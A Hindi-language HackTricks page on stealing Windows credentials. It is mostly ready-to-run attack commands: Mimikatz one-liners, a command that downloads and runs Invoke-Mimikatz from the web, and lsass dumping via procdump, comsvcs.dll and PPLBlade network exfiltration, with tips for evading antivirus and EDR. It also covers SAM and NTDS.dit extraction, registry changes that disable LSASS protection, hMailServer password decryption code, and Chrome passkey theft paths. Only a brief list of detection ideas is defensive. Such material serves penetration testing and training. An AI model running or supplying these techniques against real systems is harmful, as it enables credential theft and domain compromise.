# Windows Credentials चुराना

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**[इस पेज](credentials-mimikatz.md) में Mimikatz द्वारा किए जा सकने वाले अन्य कार्य खोजें।**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**कुछ संभावित credentials protections के बारे में यहां जानें।**](credentials-protections.md) **ये सुरक्षा उपाय Mimikatz को कुछ credentials extract करने से रोक सकते हैं।**

## Meterpreter के साथ Credentials

मेरे द्वारा बनाए गए [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) का उपयोग victim के अंदर **passwords और hashes खोजने** के लिए करें।
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV को Bypass करना

### Procdump + Mimikatz

चूंकि **Procdump से** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **एक वैध Microsoft tool है**, इसलिए इसे Defender detect नहीं करता।\
आप इस tool का उपयोग **lsass process को dump करने**, **dump को download करने** और dump से **credentials को locally extract करने** के लिए कर सकते हैं।

आप [SharpDump](https://github.com/GhostPack/SharpDump) का भी उपयोग कर सकते हैं।
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
यह प्रक्रिया [SprayKatz](https://github.com/aas-n/spraykatz) द्वारा स्वचालित रूप से की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**ध्यान दें**: कुछ **AV**, **procdump.exe से lsass.exe को dump करने** के उपयोग को **malicious** के रूप में **detect** कर सकते हैं, क्योंकि वे **"procdump.exe" और "lsass.exe"** string को **detect** कर रहे होते हैं। इसलिए **lsass.exe के नाम** के बजाय, **lsass.exe के PID** को **procdump** के **argument** के रूप में पास करना अधिक **stealthy** है।

### **comsvcs.dll** से lsass को Dump करना

`C:\Windows\System32` में पाई जाने वाली **comsvcs.dll** नामक DLL crash होने की स्थिति में **process memory को dump करने** के लिए जिम्मेदार होती है। इस DLL में **`MiniDumpW`** नामक एक **function** शामिल है, जिसे `rundll32.exe` का उपयोग करके invoke करने के लिए design किया गया है।\
पहले दो arguments का उपयोग करना अप्रासंगिक है, लेकिन तीसरा argument तीन components में विभाजित होता है। Dump किए जाने वाले process की ID पहला component होती है, dump file का location दूसरा component होता है, और तीसरा component केवल **full** शब्द होता है। कोई वैकल्पिक option उपलब्ध नहीं है।\
इन तीन components को parse करने के बाद, DLL dump file बनाने और निर्दिष्ट process की memory को इस file में transfer करने का काम करती है।\
**comsvcs.dll** का उपयोग lsass process को dump करने के लिए किया जा सकता है, जिससे procdump को upload और execute करने की आवश्यकता समाप्त हो जाती है। इस method का विवरण [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) पर दिया गया है।<sup>[[9]](#references)</sup>

Execution के लिए निम्न command का उपयोग किया जाता है:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**आप इस प्रक्रिया को [**lssasy**](https://github.com/Hackndo) के साथ automate कर सकते हैं।**

### **Task Manager के साथ lsass Dumping**

1. Task Bar पर Right click करें और Task Manager पर click करें
2. More details पर click करें
3. Processes tab में "Local Security Authority Process" process खोजें
4. "Local Security Authority Process" process पर Right click करें और "Create dump file" पर click करें।

### procdump के साथ lsass Dumping

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) एक Microsoft signed binary है, जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite का हिस्सा है।
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade के साथ lsass dump करना

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है, जो memory dump को obfuscate करने और उसे disk पर लिखे बिना remote workstations पर transfer करने का support करता है।

**मुख्य functionalities**:

1. PPL protection को bypass करना
2. Defender के signature-based detection mechanisms से बचने के लिए memory dump files को obfuscate करना
3. RAW और SMB upload methods का उपयोग करके memory dump को disk पर लिखे बिना upload करना (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDump के बिना SSP-आधारित LSASS dumping

Ink Dragon एक three-stage dumper **LalsDumper** के नाम से उपलब्ध कराता है, जो कभी भी `MiniDumpWriteDump` को call नहीं करता, इसलिए उस API पर मौजूद EDR hooks कभी trigger नहीं होते:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` में 32 छोटे अक्षरों वाले `d` characters से बने placeholder को खोजता है, उसे `rtu.txt` के absolute path से overwrite करता है, patched DLL को `nfdp.dll` के रूप में save करता है और `AddSecurityPackageA("nfdp","fdp")` को call करता है। इससे **LSASS** malicious DLL को नए Security Support Provider (SSP) के रूप में load करने के लिए मजबूर होता है।
2. **LSASS के अंदर Stage 2** – जब LSASS `nfdp.dll` को load करता है, तो DLL `rtu.txt` को पढ़ती है, प्रत्येक byte को `0x20` के साथ XOR करती है और execution transfer करने से पहले decoded blob को memory में map करती है।
3. **Stage 3 dumper** – mapped payload hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`) से resolved **direct syscalls** का उपयोग करके MiniDump logic को फिर से implement करता है। `Tom` नाम का dedicated export `%TEMP%\<pid>.ddt` को open करता है, compressed LSASS dump को file में stream करता है और handle को close कर देता है, ताकि exfiltration बाद में की जा सके।

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll` और `rtu.txt` को एक ही directory में रखें। Stage 1 hard-coded placeholder को `rtu.txt` के absolute path से rewrite करता है, इसलिए इन्हें अलग करने पर chain टूट जाती है।
* Registration `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` में `nfdp` को append करके होती है। LSASS को हर boot पर SSP reload कराने के लिए आप उस value को स्वयं seed कर सकते हैं।
* `%TEMP%\*.ddt` files compressed dumps होती हैं। इन्हें locally decompress करें, फिर credential extraction के लिए Mimikatz/Volatility को दें।
* `lals.exe` चलाने के लिए admin/SeTcb rights आवश्यक हैं, ताकि `AddSecurityPackageA` सफल हो सके; call के return होने के बाद LSASS rogue SSP को transparently load करता है और Stage 2 execute करता है।
* Disk से DLL हटाने पर वह LSASS से evict नहीं होती। या तो registry entry delete करके LSASS को restart करें (reboot), या उसे long-term persistence के लिए रहने दें।

## CrackMapExec

### SAM hashes dump करें
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### लक्ष्य DC से NTDS.dit Dump करें
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### लक्षित DC से NTDS.dit password history dump करें
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### प्रत्येक NTDS.dit account के लिए pwdLastSet attribute दिखाएँ
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM और SYSTEM चुराना

इन files को _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM._ में **स्थित** होना चाहिए। लेकिन **आप इन्हें सामान्य तरीके से कॉपी नहीं कर सकते** क्योंकि वे protected हैं।

### Registry से

इन files को चुराने का सबसे आसान तरीका Registry से उनकी copy प्राप्त करना है:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**डाउनलोड** उन files को अपनी Kali machine पर और **hashes निकालें** निम्न का उपयोग करके:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

आप इस service का उपयोग करके protected files की copy बना सकते हैं। आपके पास Administrator अधिकार होने चाहिए।

#### vssadmin का उपयोग

vssadmin binary केवल Windows Server versions में उपलब्ध है.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
लेकिन आप यही काम **Powershell** से भी कर सकते हैं। यह **SAM file को कॉपी करने का तरीका** दिखाने वाला एक उदाहरण है (इस्तेमाल की गई hard drive "C:" है और इसे C:\users\Public में सेव किया गया है), लेकिन आप इसका उपयोग किसी भी protected file को कॉपी करने के लिए कर सकते हैं:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

अंत में, आप SAM, SYSTEM और ntds.dit की copy बनाने के लिए [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का भी उपयोग कर सकते हैं।
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** फ़ाइल को **Active Directory** का हृदय माना जाता है, क्योंकि इसमें user objects, groups और उनकी memberships से संबंधित महत्वपूर्ण data होता है। Domain users के **password hashes** इसी में store किए जाते हैं। यह फ़ाइल एक **Extensible Storage Engine (ESE)** database है और **_%SystemRoom%/NTDS/ntds.dit_** पर मौजूद रहती है।

इस database में तीन primary tables maintain की जाती हैं:

- **Data Table**: यह table users और groups जैसे objects का विवरण store करती है।
- **Link Table**: यह group memberships जैसे relationships को track करती है।
- **SD Table**: प्रत्येक object के **security descriptors** यहां रखे जाते हैं, जिससे stored objects की security और access control सुनिश्चित होती है।

Christoffer Andersson का database-layer research इन tables और उनके version-specific behavior को अधिक विस्तार से document करता है।<sup>[[8]](#references)</sup>

Windows उस फ़ाइल के साथ interact करने के लिए _Ntdsa.dll_ का उपयोग करता है और इसका उपयोग _lsass.exe_ द्वारा किया जाता है। इसके बाद, **NTDS.dit** फ़ाइल का **कुछ हिस्सा `lsass`** memory के **अंदर** मौजूद हो सकता है (performance improve करने के लिए **cache** का उपयोग किए जाने के कारण संभवतः आप latest accessed data खोज सकते हैं)।

#### NTDS.dit के अंदर hashes को Decrypt करना

Hash को तीन बार encrypt किया जाता है:

1. **BOOTKEY** और **RC4** का उपयोग करके Password Encryption Key (**PEK**) को decrypt करें।
2. **PEK** और **RC4** का उपयोग करके **hash** को decrypt करें।
3. **DES** का उपयोग करके **hash** को decrypt करें।

**PEK** का **same value प्रत्येक domain controller पर होता है**, लेकिन इसे **NTDS.dit** के अंदर उस domain controller के **SYSTEM** hive से प्राप्त DC-specific **BOOTKEY** के साथ encrypt किया जाता है। इसलिए credentials extract करने के लिए **NTDS.dit** और **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) दोनों आवश्यक हैं।

### Ntdsutil का उपयोग करके NTDS.dit को Copy करना

Windows Server 2008 से उपलब्ध।
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
आप **ntds.dit** फ़ाइल को कॉपी करने के लिए [**volume shadow copy**](#stealing-sam-and-system) trick का भी उपयोग कर सकते हैं। याद रखें कि आपको **SYSTEM file** की एक कॉपी भी चाहिए होगी (फिर से, इसे [**registry से dump करें या volume shadow copy**](#stealing-sam-and-system) trick का उपयोग करें)।

### **NTDS.dit से hashes extract करना**

एक बार जब आप **NTDS.dit** और **SYSTEM** files **प्राप्त कर लें**, तो आप hashes **extract** करने के लिए _secretsdump.py_ जैसे tools का उपयोग कर सकते हैं:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
आप एक मान्य domain admin user का उपयोग करके उन्हें **स्वचालित रूप से extract** भी कर सकते हैं:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**बड़ी NTDS.dit files** के लिए इसे [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करके extract करने की सलाह दी जाती है।

अंत में, आप **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ या **mimikatz** `lsadump::lsa /inject` का भी उपयोग कर सकते हैं।

### **NTDS.dit से domain objects को SQLite database में extract करना**

जब raw NTDS.dit file पहले ही retrieve की जा चुकी हो, तब [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) की सहायता से NTDS objects को SQLite database में extract किया जा सकता है। इसमें केवल secrets ही extract नहीं किए जाते, बल्कि आगे की information extraction के लिए entire objects और उनके attributes भी extract किए जाते हैं।
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive वैकल्पिक है, लेकिन यह secrets decryption (NT और LM hashes, cleartext passwords जैसे supplemental credentials, kerberos या trust keys, NT और LM password histories) की अनुमति देता है। अन्य जानकारी के साथ, निम्नलिखित data extract किया जाता है: user और machine accounts तथा उनके hashes, UAC flags, last logon और password change का timestamp, accounts का description, names, UPN, SPN, groups और recursive memberships, organizational units tree और membership, trusted domains तथा trusts का type, direction और attributes...

## Lazagne

[यहाँ](https://github.com/AlessandroZ/LaZagne/releases) से binary download करें। आप इस binary का उपयोग कई software से credentials extract करने के लिए कर सकते हैं।
```
lazagne.exe all
```
## SAM और LSASS से credentials निकालने के लिए अन्य tools

### Windows credentials Editor (WCE)

इस tool का उपयोग memory से credentials निकालने के लिए किया जा सकता है। इसे यहाँ से download करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file से credentials निकालें
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM file से credentials extract करें
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

इसे यहाँ से Download करें:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) और बस इसे **execute करें**, passwords extract हो जाएँगे।

## निष्क्रिय RDP sessions को Mining करना और security controls को कमजोर करना

Ink Dragon के FinalDraft RAT में `DumpRDPHistory` tasker शामिल है, जिसकी techniques किसी भी red-teamer के लिए उपयोगी हैं:<sup>[[3]](#references)</sup>

### DumpRDPHistory-शैली का telemetry collection

* **Outbound RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` पर प्रत्येक user hive को parse करें। प्रत्येक subkey में server name, `UsernameHint` और last write timestamp store होता है। आप PowerShell से FinalDraft की logic को replicate कर सकते हैं:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log में Event IDs **21** (सफल logon) और **25** (disconnect) को query करके पता लगाएँ कि box को किसने administer किया:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

जब आपको पता चल जाए कि कौन-सा Domain Admin नियमित रूप से connect करता है, तो उसकी **disconnected** session के मौजूद रहने के दौरान LSASS को (LalsDumper/Mimikatz से) dump करें। CredSSP + NTLM fallback उनके verifier और tokens को LSASS में छोड़ देता है, जिन्हें बाद में SMB/WinRM पर replay करके `NTDS.dit` प्राप्त किया जा सकता है या domain controllers पर persistence स्थापित की जा सकती है।

### FinalDraft द्वारा लक्षित Registry downgrades

वही implant credential theft को आसान बनाने के लिए कई registry keys के साथ भी छेड़छाड़ करता है:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` सेट करने से RDP के दौरान पूर्ण credential/ticket reuse लागू होता है, जिससे pass-the-hash शैली के pivots संभव हो जाते हैं।
* `LocalAccountTokenFilterPolicy=1` UAC token filtering को अक्षम करता है, इसलिए local admins को network पर unrestricted tokens मिलते हैं।
* `DSRMAdminLogonBehavior=2` DC के online रहते DSRM administrator को log on करने देता है, जिससे attackers को एक और built-in high-privilege account मिल जाता है।
* `RunAsPPL=0` LSASS PPL protections को हटा देता है, जिससे LalsDumper जैसे dumpers के लिए memory access आसान हो जाता है।

## hMailServer database credentials (compromise के बाद)

hMailServer अपना DB password `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` में `[Database] Password=` के अंतर्गत संग्रहीत करता है। यह value static key `THIS_KEY_IS_NOT_SECRET` और 4-byte word endianness swaps के साथ Blowfish-encrypted होती है। INI से hex string का उपयोग इस Python snippet के साथ करें:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
clear-text password के साथ, file locks से बचने के लिए SQL CE database को copy करें, 32-bit provider load करें, और hashes query करने से पहले आवश्यकता होने पर upgrade करें:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` column hMailServer hash format (hashcat mode `1421`) का उपयोग करता है। इन values को crack करने से WinRM/SSH pivots के लिए reusable credentials मिल सकते हैं।

## LSA Logon Callback Interception (LsaApLogonUserEx2)

कुछ tooling **plaintext logon passwords** को LSA logon callback `LsaApLogonUserEx2` को intercept करके capture करती है। इसका उद्देश्य authentication package callback को hook या wrap करना है, ताकि credentials **logon के दौरान** (hashing से पहले) capture किए जा सकें और फिर disk पर लिखे जाएं या operator को लौटाए जाएं। इसे आमतौर पर ऐसे helper के रूप में implement किया जाता है जो LSA में inject या register होता है और प्रत्येक सफल interactive/network logon event के username, domain और password को record करता है।<sup>[[1]](#references)</sup>

Operational notes:
- Authentication path में helper load करने के लिए local admin/SYSTEM privileges आवश्यक हैं।
- Captured credentials केवल logon होने पर दिखाई देते हैं (hook के आधार पर interactive, RDP, service या network logon)।

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) saved connection information को per-user `sqlstudio.bin` file में store करता है। Dedicated dumpers इस file को parse करके saved SQL credentials recover कर सकते हैं। ऐसे shells में जो केवल command output लौटाते हैं, file को अक्सर Base64 के रूप में encode करके stdout पर print करके exfiltrate किया जाता है।<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
ऑपरेटर पक्ष पर, फ़ाइल को फिर से बनाएँ और credentials recover करने के लिए dumper को स्थानीय रूप से चलाएँ:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Windows पर Chrome से Passkeys / WebAuthn credential theft

यदि **victim user** के रूप में code execution किसी Windows host पर **Chrome + Google Password Manager synced passkeys** का उपयोग करते हुए प्राप्त किया जाता है, तो passkeys एक दिलचस्प post-exploitation target बन जाती हैं, वह भी **admin/SYSTEM** के बिना।<sup>[[4]](#references)</sup>

### दिलचस्प local artifacts
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** protobuf-encoded **`WebauthnCredentialSpecifics`** records संग्रहीत करता है। उसी user की process synced passkeys के **RP ID**, **username**, **credential ID**, और encrypted private-key material को enumerate कर सकती है।<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** local device-enrollment state, जैसे **`wrapped_identity_private_key`** और synced credentials को recover करने के लिए उपयोग किए जाने वाले wrapped secret को संग्रहीत करता है।<sup>[[4]](#references)</sup>

त्वरित triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs का अभी भी local signing oracle के रूप में दुरुपयोग किया जा सकता है

यदि browser किसी TPM-backed identity key को **`NCRYPT_OPAQUE_KEY_BLOB`** के रूप में export करता है और उस blob को user-accessible state में store करता है, तो malware को raw private key extract करने की आवश्यकता नहीं होती। वह उसी **machine** पर blob को फिर से import करके local TPM से attacker-controlled data पर sign करने के लिए कह सकता है:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
इसका अर्थ है कि **hardware binding off-device export को रोकता है, लेकिन compromised endpoint पर उसी user के उपयोग को नहीं रोकता**।

### Practical abuse paths

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Chrome के LevelDB से `WebauthnCredentialSpecifics` को enumerate करें।
- Passkey login शुरू करें और एक fresh WebAuthn challenge प्राप्त करें।
- Cloud-authenticator request binding पर sign करने के लिए victim TPM पर चुराए गए `wrapped_identity_private_key` blob का उपयोग करें।
- प्राप्त assertion को relying party तक relay करें।
- यह विशेष रूप से तब उपयोगी है जब RP `userVerification=preferred` स्वीकार करता हो या **`UV=0`** वाले assertions को reject करने में विफल रहता हो।
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- `passkey_enclave_state` को delete करके या valid signed `device/forget` operation भेजकर re-onboarding को force करें।
- यदि onboarding device को **`uv_key_pending`** स्थिति में छोड़ देता है, तो attacker-controlled UV public key register करें।
- यदि provider नई UV key के लिए attestation / secure-hardware origin verify नहीं करता, तो बाद में attacker key से किए गए signatures को **`UV=1`** माना जाता है।
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Recovery या rejoin को force करें ताकि Chrome synced-passkey master secret fetch करे।
- `passkey_enclave_state` के recreation/modification पर नज़र रखें, फिर Chrome memory dump करें, जबकि plaintext **security domain secret (SDS)** memory में मौजूद हो।
- प्रत्येक `WebauthnCredentialSpecifics` record में encrypted fields को decrypt करने और portable WebAuthn private keys recover करने के लिए प्राप्त SDS का उपयोग करें।

### DFIR / detection ideas

- **Deletion/recreation** of `passkey_enclave_state` को monitor करें।<sup>[[4]](#references)</sup>
- Non-browser processes द्वारा Chrome **`Sync Data\LevelDB`** तक abnormal access पर alert करें।
- **Chrome memory dumps** या suspicious cross-process memory access पर alert करें।
- बार-बार आने वाले **Google Password Manager recovery PIN** prompts या unexpected re-onboarding की जाँच करें।
- याद रखें कि synced passkeys के लिए WebAuthn **`signCount`** अक्सर उपयोगी नहीं होता, क्योंकि यह constant रह सकता है; इसलिए classic clone detection कमजोर होती है।

## References

- [1] [Unit 42 – High-Value Sectors को Target करने वाले वर्षों से Undetected Operations की Investigation](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP के माध्यम से Word VBA macro phishing → hMailServer credential decryption → SYSTEM तक Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: Relay Network और Stealthy Offensive Operation की Inner Workings का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Passwordless Authentication में एक Novel Attack Surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Microsoft Systems और Networks पर Attacks](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [How the Active Directory Data Store Really Works: NTDS.dit के अंदर (Part 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
{{#include ../../banners/hacktricks-training.md}}
